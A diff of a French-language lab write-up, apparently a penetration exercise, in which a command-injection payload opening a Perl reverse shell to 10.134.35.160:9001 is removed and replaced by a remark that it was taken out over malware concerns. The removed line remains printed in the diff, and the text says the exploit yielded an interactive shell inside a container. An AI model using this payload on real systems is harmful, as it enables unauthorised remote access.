@@ -89,9 +89,7 @@ Après cette modification, les services sont accessibles et fonctionnent correct
 
 On est passé par [reverse shell ](https://www.revshells.com/) pour generer un  reverse shell perl.
 
-```markdown
-google.com; perl -e 'use Socket;$i="10.134.35.160";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
+(J'ai enlevé cette partie du code Perl pour résoudre le problème de malware. )
 
 
 On a donc réussi à executer une commande à distance et on est maintenant dans un shell interactif à l'interieur du containeur mais pas en tant que root.        
